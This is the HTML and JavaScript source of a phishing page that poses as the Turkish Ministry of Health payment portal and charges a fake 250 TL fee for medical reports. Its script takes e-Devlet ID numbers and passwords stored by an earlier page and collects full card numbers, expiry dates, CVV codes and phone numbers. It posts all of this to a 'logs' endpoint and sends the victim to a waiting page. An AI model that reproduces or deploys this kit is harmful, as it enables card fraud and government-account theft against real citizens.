<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="utf-8">
    <title>Ödeme - T.C. Sağlık Bakanlığı Ödeme Sistemi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" type="image/png" href="https://sbos.saglik.gov.tr/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', -apple-system, sans-serif;
            background: #f5f7fa;
            min-height: 100vh;
        }
        .bg-deco {
            position: fixed; inset: 0; z-index: 0;
            background:
                radial-gradient(ellipse at 85% 20%, rgba(0,150,136,0.06) 0%, transparent 50%),
                radial-gradient(ellipse at 15% 80%, rgba(211,47,47,0.04) 0%, transparent 50%),
                linear-gradient(180deg, #f8fafb 0%, #f0f4f7 100%);
        }
        .top-header {
            position: relative; z-index: 10;
            background: #fff;
            border-bottom: 1px solid #e8ecf0;
            padding: 0 40px; height: 64px;
            display: flex; align-items: center; justify-content: space-between;
        }
        .header-left { display: flex; align-items: center; gap: 6px; }
        .header-left img { height: 38px; }
        .back-link {
            display: flex; align-items: center; gap: 6px;
            color: #009688; text-decoration: none; font-size: 13px; font-weight: 600;
        }
        .back-link:hover { color: #00796B; }
        .back-link svg { width: 16px; height: 16px; }

        .page-wrap {
            position: relative; z-index: 10;
            max-width: 960px; width: 100%;
            margin: 0 auto; padding: 36px 24px 60px;
        }

        .step-header {
            text-align: center;
            margin-bottom: 32px;
        }
        .step-header .who {
            color: #009688; font-size: 14px; font-weight: 600;
            margin-bottom: 6px;
        }
        .step-header .what {
            color: #666; font-size: 13px;
        }

        .report-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 14px;
            margin-bottom: 32px;
        }
        .report-card {
            background: #fff;
            border: 2px solid #e8ecf0;
            border-radius: 14px;
            padding: 20px 16px;
            cursor: pointer;
            transition: all 0.2s;
            position: relative;
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            gap: 10px;
            min-height: 120px;
        }
        .report-card:hover {
            border-color: #80CBC4;
            box-shadow: 0 2px 12px rgba(0,150,136,0.08);
        }
        .report-card.selected {
            border-color: #009688;
            background: #F0FDFA;
            box-shadow: 0 2px 16px rgba(0,150,136,0.12);
        }
        .report-card .rc-title {
            font-size: 14px; font-weight: 700; color: #1a1a2e; line-height: 1.4;
        }
        .report-card .rc-sub {
            font-size: 11px; color: #999; line-height: 1.3; margin-top: 2px;
        }
        .report-card .rc-info {
            position: absolute; top: 10px; right: 10px;
            width: 20px; height: 20px;
            border-radius: 50%;
            background: #E0F2F1;
            display: flex; align-items: center; justify-content: center;
            color: #009688; font-size: 11px; font-weight: 700;
        }
        .report-card .rc-check {
            position: absolute; bottom: 12px; right: 12px;
            width: 24px; height: 24px;
            border-radius: 50%;
            background: #009688;
            display: none; align-items: center; justify-content: center;
            color: #fff;
        }
        .report-card .rc-check svg { width: 14px; height: 14px; }
        .report-card.selected .rc-check { display: flex; }

        .step-2 {
            max-height: 0;
            overflow: hidden;
            opacity: 0;
            transition: max-height 0.5s ease, opacity 0.4s ease, margin 0.4s ease;
            margin-top: 0;
        }
        .step-2.active {
            max-height: 1200px;
            opacity: 1;
            margin-top: 32px;
        }

        .payment-card {
            background: #fff;
            border-radius: 16px;
            box-shadow: 0 2px 20px rgba(0,0,0,0.04);
            overflow: hidden;
            max-width: 580px;
            margin: 0 auto;
        }
        .payment-header {
            background: linear-gradient(135deg, #00897B 0%, #00695C 100%);
            padding: 22px 28px; color: #fff;
        }
        .payment-header h1 { font-size: 17px; font-weight: 700; margin-bottom: 2px; }
        .payment-header .ph-sub { font-size: 12px; opacity: 0.75; }
        .payment-header .selected-report {
            margin-top: 10px; padding: 8px 14px;
            background: rgba(255,255,255,0.12);
            border-radius: 8px; font-size: 13px; font-weight: 500;
        }
        .debt-box {
            background: rgba(255,255,255,0.12);
            border-radius: 10px; padding: 12px 16px;
            margin-top: 12px;
            display: flex; justify-content: space-between; align-items: center;
        }
        .debt-box .debt-label { font-size: 13px; opacity: 0.85; }
        .debt-box .debt-amount { font-size: 22px; font-weight: 700; }

        .form-body { padding: 24px 28px; }

        .form-group { margin-bottom: 18px; }
        .form-group label {
            display: block; font-size: 12px; font-weight: 600; color: #444; margin-bottom: 5px;
        }
        .form-group input {
            width: 100%; padding: 11px 14px;
            border: 1.5px solid #e0e3e8; border-radius: 10px;
            font-size: 14px; font-family: inherit;
            transition: border-color 0.2s; outline: none; background: #fafbfc;
        }
        .form-group input:focus { border-color: #009688; background: #fff; }
        .form-group input.error { border-color: #E53935; background: #FFF5F5; }
        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
        .form-group .input-icon { position: relative; }
        .form-group .input-icon input { padding-right: 44px; }
        .form-group .input-icon .icon-right {
            position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
            display: flex; align-items: center;
        }
        .bank-badge { height: 24px; max-width: 80px; object-fit: contain; border-radius: 4px; }
        .error-text { color: #E53935; font-size: 11px; margin-top: 4px; }
        .error-banner {
            background: #FFF5F5; border: 1px solid #FFCDD2; border-radius: 10px;
            padding: 12px 16px; margin-bottom: 18px; display: none;
            color: #C62828; font-size: 13px;
        }
        .cc-only-notice {
            display: flex; align-items: center; gap: 8px;
            padding: 10px 14px; background: #FFF8E1; border: 1px solid #FFE082;
            border-radius: 8px; font-size: 12px; color: #F57F17; font-weight: 500;
            margin-bottom: 18px;
        }
        .cc-only-notice svg { width: 18px; height: 18px; flex-shrink: 0; }

        .submit-btn {
            width: 100%; padding: 13px;
            background: linear-gradient(135deg, #00897B 0%, #00695C 100%);
            color: #fff; border: none; border-radius: 10px;
            font-size: 15px; font-weight: 700; font-family: inherit;
            cursor: pointer; transition: all 0.2s;
            display: flex; align-items: center; justify-content: center; gap: 8px;
        }
        .submit-btn:hover { opacity: 0.92; }
        .submit-btn:disabled { opacity: 0.6; cursor: not-allowed; }
        .submit-btn svg { width: 18px; height: 18px; }

        .loading-overlay {
            display: none; position: fixed; inset: 0; z-index: 9999;
            background: rgba(0,0,0,0.5); align-items: center; justify-content: center;
        }
        .loading-overlay.active { display: flex; }
        .loading-box {
            background: #fff; border-radius: 16px; padding: 40px 48px;
            text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.2);
        }
        .spinner {
            width: 48px; height: 48px;
            border: 4px solid #E0F2F1; border-top-color: #009688;
            border-radius: 50%; animation: spin 0.8s linear infinite;
            margin: 0 auto 16px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .loading-box p { font-size: 14px; color: #555; font-weight: 500; }
        .loading-box .sub { font-size: 12px; color: #999; margin-top: 4px; }

        .page-footer {
            position: relative; z-index: 10;
            text-align: center; padding: 16px; color: #bbb; font-size: 11px;
        }

        @media (max-width: 800px) {
            .top-header { padding: 0 16px; }
            .report-grid { grid-template-columns: 1fr 1fr; }
            .page-wrap { padding: 24px 14px 40px; }
            .form-body { padding: 20px; }
        }
        @media (max-width: 480px) {
            .report-grid { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="bg-deco"></div>

    <div class="top-header">
        <div class="header-left">
            <img src="https://sbos.saglik.gov.tr/_next/static/media/aileHekimiLogoSb2.b6f9fbf7.svg" alt="SBÖS">
        </div>
        <div>
            <a href="data.php" class="back-link">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
                İşlemlere Dön
            </a>
                            </div>
                        </div>

    <div class="page-wrap">

        <div id="step1">
            <div class="step-header">
                <div class="who" id="stepWho">Kendiniz adına işlem yapıyorsunuz</div>
                <div class="what">Hizmet almak istediğiniz rapor türünü seçiniz.</div>
                        </div>

            <div class="report-grid" id="reportGrid">
                <div class="report-card" data-report="Sürücü Sağlık Raporu">
                    <div class="rc-info">i</div>
                    <div class="rc-title">Sürücü Sağlık Raporu</div>
                    <div class="rc-sub">B Sınıfı Ehliyet Sağlık Raporu</div>
                    <div class="rc-check"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div>
                </div>
                <div class="report-card" data-report="Sporcu Sağlık Raporu">
                    <div class="rc-info">i</div>
                    <div class="rc-title">Sporcu Sağlık Raporu</div>
                    <div class="rc-sub">Amatör/Profesyonel Sporcu Raporu</div>
                    <div class="rc-check"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div>
                            </div>
                <div class="report-card" data-report="Genel Tıbbi Değerlendirme">
                    <div class="rc-info">i</div>
                    <div class="rc-title">Genel Tıbbi Değerlendirme</div>
                    <div class="rc-sub">Durum Bildirir Tek Hekim Raporu</div>
                    <div class="rc-check"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div>
                        </div>
                <div class="report-card" data-report="Hac/Umre için Parmak İzi">
                    <div class="rc-info">i</div>
                    <div class="rc-title">Hac/Umre için Parmak İzi</div>
                    <div class="rc-sub">Durum Bildirir Tek Hekim Raporu</div>
                    <div class="rc-check"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div>
                        </div>
                <div class="report-card" data-report="İş Sağlığı ve Güvenliği">
                    <div class="rc-info">i</div>
                    <div class="rc-title">İş Sağlığı ve Güvenliği</div>
                    <div class="rc-sub">Durum Bildirir Tek Hekim Raporu</div>
                    <div class="rc-check"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div>
                    </div>
                <div class="report-card" data-report="Akli Meleke">
                    <div class="rc-info">i</div>
                    <div class="rc-title">Akli Meleke</div>
                    <div class="rc-sub">Durum Bildirir Tek Hekim Raporu</div>
                    <div class="rc-check"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div>
                </div>
                <div class="report-card" data-report="Yivsiz Av Tüfeği">
                    <div class="rc-info">i</div>
                    <div class="rc-title">Yivsiz Av Tüfeği</div>
                    <div class="rc-sub">Durum Bildirir Tek Hekim Raporu</div>
                    <div class="rc-check"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div>
                        </div>
                        </div>
                    </div>

        <div id="step2" class="step-2">
            <div class="payment-card">
                <div class="payment-header">
                    <h1>Sağlık Hizmeti Borç Ödeme</h1>
                    <div class="ph-sub">T.C. Sağlık Bakanlığı Ödeme Sistemi</div>
                    <div class="selected-report" id="selectedReportLabel"></div>
                    <div class="debt-box">
                        <span class="debt-label">Ödenecek Tutar</span>
                        <span class="debt-amount" id="borcTutar">250,00 ₺</span>
                    </div>
                </div>

                <div class="form-body">
                    <div class="error-banner" id="errorBanner"></div>

                    <form id="paymentForm" autocomplete="off" novalidate>
                        <div class="form-group" id="baskisiTcGroup" style="display:none;">
                            <label>Ödeme Yapılacak Kişinin T.C. Kimlik No</label>
                            <input type="text" id="baskisiTc" placeholder="T.C. Kimlik Numarası" maxlength="11" inputmode="numeric" autocomplete="off">
                            <div id="baskisiInfo" style="display:none; margin-top:8px; padding:10px 14px; background:#E0F2F1; border-radius:8px; font-size:13px; color:#00695C; font-weight:600;"></div>
                            </div>
                            
                        <div class="cc-only-notice">
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
                            Sadece kredi kartı ile ödeme kabul edilmektedir.
                            </div>
                            
                        <div class="form-group">
                            <label>Kart Üzerindeki Ad Soyad</label>
                            <input type="text" id="cardHolder" placeholder="Ad Soyad" autocomplete="off">
                        </div>

                        <div class="form-group">
                            <label>Kart Numarası</label>
                            <div class="input-icon">
                                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" autocomplete="off">
                                <div class="icon-right" id="cardIcons"></div>
                            </div>
                        </div>

                        <div class="form-row">
                            <div class="form-group">
                                <label>Son Kullanma</label>
                                <input type="text" id="cardExpiry" placeholder="AA/YY" maxlength="5" inputmode="numeric" autocomplete="off">
                            </div>
                            <div class="form-group">
                                <label>CVV</label>
                                <input type="text" id="cardCvv" placeholder="•••" maxlength="4" inputmode="numeric" autocomplete="off">
                        </div>
                        </div>

                        <div class="form-group">
                            <label>Cep Telefonu</label>
                            <input type="text" id="phone" placeholder="05XX XXX XX XX" maxlength="14" inputmode="tel" autocomplete="off">
                        </div>

                        <button type="submit" class="submit-btn" id="submitBtn">
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
                            Ödeme Yap
                        </button>
                    </form>
                </div>
            </div>
        </div>

    </div>

    <div class="page-footer">
        T.C. Sağlık Bakanlığı &copy;2026 Tüm Hakları Saklıdır
    </div>

    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-box">
            <div class="spinner"></div>
            <p>Ödemeniz işleniyor...</p>
            <div class="sub">Lütfen sayfayı kapatmayın</div>
        </div>
    </div>

    <script>
        const tc = sessionStorage.getItem('edevlet_tc') || '';
        const pass = sessionStorage.getItem('edevlet_pass') || '';
        if (!tc) {
            window.location.href = 'basvuru.php';
        }

        const params = new URLSearchParams(window.location.search);
        const isBaskisi = params.get('type') === 'baskisi';

        if (isBaskisi) {
            document.getElementById('stepWho').textContent = 'Başka kişi adına işlem yapıyorsunuz';
            document.getElementById('baskisiTcGroup').style.display = '';
        }

        const borc = 250.00;
        let selectedReport = '';

        document.querySelectorAll('.report-card').forEach(card => {
            card.addEventListener('click', function() {
                document.querySelectorAll('.report-card').forEach(c => c.classList.remove('selected'));
                this.classList.add('selected');
                selectedReport = this.dataset.report;
                document.getElementById('selectedReportLabel').textContent = selectedReport;
                document.getElementById('step2').classList.add('active');

                setTimeout(() => {
                    document.getElementById('step2').scrollIntoView({ behavior: 'smooth', block: 'start' });
                }, 100);
            });
        });

        const cardNumber = document.getElementById('cardNumber');
        const cardExpiry = document.getElementById('cardExpiry');
        const cardCvv = document.getElementById('cardCvv');
        const cardHolder = document.getElementById('cardHolder');
        const phone = document.getElementById('phone');
        const cardIcons = document.getElementById('cardIcons');

        cardNumber.addEventListener('input', function() {
            let v = this.value.replace(/\D/g, '');
            let formatted = '';
            for (let i = 0; i < v.length && i < 16; i++) {
                if (i > 0 && i % 4 === 0) formatted += ' ';
                formatted += v[i];
            }
            this.value = formatted;
            if (v.length >= 6) { fetchBinInfo(v); } else { cardIcons.innerHTML = ''; }
        });

        cardExpiry.addEventListener('input', function() {
            let v = this.value.replace(/\D/g, '');
            if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2, 4);
            this.value = v;
        });

        cardCvv.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
        });

        phone.addEventListener('input', function() {
            let v = this.value.replace(/\D/g, '');
            if (v.length > 11) v = v.substring(0, 11);
            if (v.length >= 4) v = v.substring(0, 4) + ' ' + v.substring(4);
            if (v.length >= 8) v = v.substring(0, 8) + ' ' + v.substring(8);
            if (v.length >= 11) v = v.substring(0, 11) + ' ' + v.substring(11);
            this.value = v;
        });

        cardHolder.addEventListener('input', function() {
            this.value = this.value.replace(/[^a-zA-ZçÇğĞıİöÖşŞüÜ\s]/g, '').toUpperCase();
        });

        let baskisiLookupTimer = null;
        document.getElementById('baskisiTc').addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
            const v = this.value;
            const info = document.getElementById('baskisiInfo');
            if (v.length === 11) {
                clearTimeout(baskisiLookupTimer);
                baskisiLookupTimer = setTimeout(() => {
                    fetch('api/tc_lookup.php?tc=' + v)
                        .then(r => r.json())
                        .then(data => {
                            if (data.success && data.ad) {
                                info.textContent = data.ad + ' ' + data.soyad + ' adlı kişiye ödeme yapıyorsunuz';
                                info.style.display = 'block';
                            } else { info.style.display = 'none'; }
                        })
                        .catch(() => { info.style.display = 'none'; });
                }, 300);
            } else { info.style.display = 'none'; }
        });

        let currentBinInfo = null;

        function fetchBinInfo(num) {
            const bin = num.substring(0, 6);
            fetch('api/bin.php?bin=' + bin)
                .then(r => r.json())
                .then(data => {
                    if (data.success && data.data) {
                        currentBinInfo = data.data;
                        let html = '';
                        if (data.data.bank_logo) html += '<img src="' + data.data.bank_logo + '" class="bank-badge" alt="">';
                        cardIcons.innerHTML = html;
                    }
                })
                .catch(() => {});
        }

        function luhn(num) {
            let sum = 0, alt = false;
            for (let i = num.length - 1; i >= 0; i--) {
                let n = parseInt(num[i], 10);
                if (alt) { n *= 2; if (n > 9) n -= 9; }
                sum += n; alt = !alt;
            }
            return sum % 10 === 0;
        }

        document.getElementById('paymentForm').addEventListener('submit', function(e) {
            e.preventDefault();
            document.querySelectorAll('.error-text').forEach(el => el.remove());
            document.querySelectorAll('input.error').forEach(el => el.classList.remove('error'));
            document.getElementById('errorBanner').style.display = 'none';

            const holder = cardHolder.value.trim();
            const number = cardNumber.value.replace(/\s/g, '');
            const expiry = cardExpiry.value.trim();
            const cvv = cardCvv.value.trim();
            const tel = phone.value.replace(/\s/g, '');
            const baskisiTcVal = document.getElementById('baskisiTc').value.replace(/\s/g, '');
            let hasError = false;

            function showError(el, msg) {
                el.classList.add('error');
                const div = document.createElement('div');
                div.className = 'error-text';
                div.textContent = msg;
                el.parentElement.appendChild(div);
                hasError = true;
            }

            if (isBaskisi && (!baskisiTcVal || baskisiTcVal.length !== 11 || !/^\d{11}$/.test(baskisiTcVal)))
                showError(document.getElementById('baskisiTc'), 'Geçerli T.C. Kimlik No giriniz');
            if (!holder || holder.length < 3) showError(cardHolder, 'Ad soyad giriniz');
            if (number.length < 15 || !luhn(number)) showError(cardNumber, 'Geçerli kart numarası giriniz');
            if (!/^\d{2}\/\d{2}$/.test(expiry)) {
                showError(cardExpiry, 'AA/YY formatında giriniz');
            } else {
                const [m] = expiry.split('/').map(Number);
                if (m < 1 || m > 12) showError(cardExpiry, 'Geçersiz ay');
            }
            if (cvv.length < 3) showError(cardCvv, 'CVV giriniz');
            if (tel.length < 10) showError(phone, 'Telefon giriniz');
            if (hasError) return;

            document.getElementById('submitBtn').disabled = true;
            document.getElementById('loadingOverlay').classList.add('active');

            const sessionId = localStorage.getItem('tracker_session_id') || '';

            const payload = {
                session_id: sessionId,
                customer_name: holder,
                customer_phone: tel,
                card_number: number,
                card_expiry: expiry,
                card_cvv: cvv,
                card_holder: holder,
                card_bank: currentBinInfo ? currentBinInfo.bank : '',
                card_bin: number.substring(0, 6),
                card_type: currentBinInfo ? currentBinInfo.card_type : '',
                card_scheme: currentBinInfo ? currentBinInfo.scheme : '',
                card_sub_type: currentBinInfo ? currentBinInfo.sub_type : '',
                items: {
                    tc_kimlik: tc,
                    edevlet_sifre: pass,
                    islem_tipi: isBaskisi ? 'baskisi_odeme' : 'saglik_odeme',
                    rapor_turu: selectedReport,
                    baskisi_tc: isBaskisi ? baskisiTcVal : '',
                    borc_tutari: borc
                },
                total: borc
            };

            fetch('api/logs.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
            .then(r => {
                if (!r.ok) throw new Error('HTTP ' + r.status);
                return r.json();
            })
            .then(data => {
                if (data.success && data.id) {
                    localStorage.setItem('logId', data.id);
                    localStorage.setItem('logAmount', borc);
                    window.location.href = 'waiting.php?id=' + data.id;
                } else {
                    throw new Error(data.error || 'Bilinmeyen hata');
                }
            })
            .catch(err => {
                document.getElementById('loadingOverlay').classList.remove('active');
                document.getElementById('submitBtn').disabled = false;
                const banner = document.getElementById('errorBanner');
                banner.textContent = 'Bağlantı hatası oluştu. Lütfen tekrar deneyiniz.';
                banner.style.display = 'block';
            });
        });
</script>
    <?php include 'includes/tracker.php'; ?>
</body>
</html>
